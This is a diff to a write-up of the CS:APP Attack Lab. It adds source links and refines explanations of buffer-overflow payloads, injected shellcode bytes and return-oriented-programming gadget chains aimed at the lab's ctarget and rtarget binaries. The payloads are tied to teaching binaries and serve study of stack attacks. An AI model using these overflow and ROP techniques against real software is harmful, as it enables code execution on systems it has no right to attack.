@@ -23,6 +23,11 @@ Two binaries, one bug: a function reads unbounded input into a fixed stack buffe
     }
     ```
 
+    Source: <a href="https://github.com/LeeXSean/csapp-labs/tree/main/Attack_Lab/target1"><code>ctarget</code> · getbuf @ 4017a8–4017bd</a>
+    {: .code-source }
+
+    The sketch is `ctarget`'s `getbuf` at `0x4017a8`: `sub $0x28,%rsp` carves out the frame, `mov %rsp,%rdi` hands the buffer to `Gets`, and the function returns `1`. In GDB the entry `%rsp` is `0x5561dca0`, the word holding the saved return address, so the buffer begins `0x28` bytes lower at `0x5561dc78`.
+
     So bytes 0-39 fill the buffer and bytes 40-47 overwrite the **saved return address**. For this target instance: the buffer sits at `0x5561dc78`, the cookie is `0x59b997fa`, and the targets are `touch1 = 0x4017c0`, `touch2 = 0x4017ec`, `touch3 = 0x4018fa`.
 
 ``` text
@@ -37,6 +42,8 @@ Two binaries, one bug: a function reads unbounded input into a fixed stack buffe
      low addresses
 ```
 
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/tree/main/Attack_Lab/target1"><code>ctarget</code> · getbuf frame @ 4017a8–4017bd</a> (reformatted to fit)</p>
+
 ---
 
 ## Phase 1 · just change the return address { data-toc-label="Phase 1" }
@@ -48,15 +55,19 @@ bytes 0-39 : 90 x 40                     (padding)
 bytes 40-47: c0 17 40 00 00 00 00 00     (-> 0x4017c0 = touch1)
 ```
 
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase1.txt#L1-L6"><code>phase1.txt</code> L1–L6</a></p>
+
 ## Phase 2 · inject code to set the cookie { data-toc-label="Phase 2" }
 
 `touch2` demands that its argument (`%rdi`) equal the cookie. Since the stack is executable in `ctarget`, we place a few instructions **in the buffer**, return into them, and let them set `%rdi` and jump onward:
 
 ``` asm
 movl $0x59b997fa, %edi     ; the cookie into the first-argument register
-push $0x4017ec             ; push touch2's address ...
-ret                        ; ... and "return" to it
+push $0x4017ec             ; push touch2's address
+ret                        ; "return" into touch2
 ```
+
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase2.s#L1-L3"><code>phase2.s</code> L1–L3</a></p>
 
 Assembled, that's `bf fa 97 b9 59 68 ec 17 40 00 c3`. Lay it at the buffer start, pad, and set the return address to the **buffer itself** (`0x5561dc78`) so `getbuf` returns straight into our code:
 
@@ -65,6 +76,8 @@ bytes 0-10 : bf fa 97 b9 59 68 ec 17 40 00 c3   (the shellcode above)
 bytes 11-39: 90 ...                                (padding)
 bytes 40-47: 78 dc 61 55 00 00 00 00             (-> 0x5561dc78 = buffer)
 ```
+
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase2.txt#L1-L6"><code>phase2.txt</code> L1–L6</a></p>
 
 ## Phase 3 · pass a string to touch3 { data-toc-label="Phase 3" }
 
@@ -78,11 +91,15 @@ push $0x4018fa             ; touch3
 ret
 ```
 
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L1-L2"><code>phase3.txt</code> L1–L2</a> (the asm assembles to the first 11 bytes)</p>
+
 ``` text
 bytes 0-10 : bf a8 dc 61 55 68 fa 18 40 00 c3    (shellcode -> %edi = 0x5561dca8)
 bytes 40-47: 78 dc 61 55 ...                        (return into the buffer, runs the code)
 bytes 48-56: 35 39 62 39 39 37 66 61 00           ("59b997fa\0" at 0x5561dca8)
 ```
+
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L1-L7"><code>phase3.txt</code> L1–L7</a></p>
 
 ``` text
    high addresses
@@ -92,6 +109,8 @@ bytes 48-56: 35 39 62 39 39 37 66 61 00           ("59b997fa\0" at 0x5561dca8)
      buf+0x00   getbuf's old buffer          <- reused by deeper stack frames
    low addresses
 ```
+
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L6-L7"><code>phase3.txt</code> L6–L7</a></p>
 
 This matches `phase3.txt`: the shellcode occupies the start of the buffer, the saved return address points back to that shellcode, and the cookie string **`59b997fa`** follows the return slot where nested calls cannot clobber it.
 
@@ -112,7 +131,7 @@ We only need to reproduce phase 2 (put the cookie in `%rdi`, call `touch2`) usin
 
 | Address | Gadget bytes | Instruction | Effect |
 |---------|--------------|-------------|--------|
-| `0x4019cc` | `58 90 c3` | `pop %rax ; ret` | pop the next stack value into `%rax` |
+| `0x4019cc` | `58 90 c3` | `pop %rax ; nop ; ret` | pop the next stack value into `%rax` |
 | `0x4019a2` | `48 89 c7 c3` | `mov %rax,%rdi ; ret` | copy it into the argument register |
 
 The chain lays the cookie *between* the two gadget addresses, so the `pop` scoops it up:
@@ -124,6 +143,8 @@ bytes 56-63: a2 19 40 00 ...     (-> mov %rax,%rdi)
 bytes 64-71: ec 17 40 00 ...     (-> touch2)
 ```
 
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase4.txt#L6-L9"><code>phase4.txt</code> L6–L9</a></p>
+
 ## Phase 5 · computing a stack address at runtime { data-toc-label="Phase 5" }
 
 Phase 3's problem returns, now under ASLR: `touch3` needs `%rdi` pointing at the cookie string, but we no longer know any stack address. The way out is to **read `%rsp` at runtime** and add a known offset to it. The string is planted at the very end of the chain, and its distance from a captured `%rsp` is a constant — here `0x48`:
@@ -132,11 +153,11 @@ Phase 3's problem returns, now under ASLR: `touch3` needs `%rdi` pointing at the
 |---|---------|--------|--------|
 | 1 | `0x401a06` | `mov %rsp,%rax ; ret` | `%rax <- %rsp` (a live stack address) |
 | 2 | `0x4019a2` | `mov %rax,%rdi ; ret` | `%rdi <- %rsp` (the base) |
-| 3 | `0x4019ab` | `pop %rax ; ret` | `%rax <- 0x48` (the offset, next on the stack) |
-| 4 | `0x401a42` | `mov %eax,%edx ; ret` | shuffle the offset ... |
-| 5 | `0x401a34` | `mov %edx,%ecx ; ret` | ... through the only |
-| 6 | `0x401a13` | `mov %ecx,%esi ; ret` | ... available registers -> `%esi` |
-| 7 | `0x4019d6` | `lea (%rdi,%rsi,1),%rax` | `%rax <- base + offset` = string address |
+| 3 | `0x4019ab` | `pop %rax ; nop ; ret` | `%rax <- 0x48` (the offset, next on the stack) |
+| 4 | `0x401a42` | `mov %eax,%edx ; test %al,%al ; ret` | hold the offset in `%edx` |
+| 5 | `0x401a34` | `mov %edx,%ecx ; cmp %cl,%cl ; ret` | carry it on to `%ecx` |
+| 6 | `0x401a13` | `mov %ecx,%esi ; nop ; nop ; ret` | land it in `%esi`, the register `lea` needs |
+| 7 | `0x4019d6` | `lea (%rdi,%rsi,1),%rax ; ret` | `%rax <- base + offset` = string address |
 | 8 | `0x4019a2` | `mov %rax,%rdi ; ret` | put it in the argument register |
 | — | `0x4018fa` | `touch3` | reads the cookie string at `%rdi` |
 
@@ -155,4 +176,6 @@ Why the register relay in steps 4-6? The farm offers no direct `pop`/`mov` into 
      offset = string(0x78) - captured %rsp(0x30) = 0x48
 ```
 
-That is ROP in a nutshell: with no new code and no fixed addresses, a carefully ordered stack of pointers still computes exactly what the attacker needs.
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase5.txt#L1-L16"><code>phase5.txt</code> L1–L16</a></p>
+
+No new code and no fixed addresses: a carefully ordered stack of pointers computes the address the attacker needs.
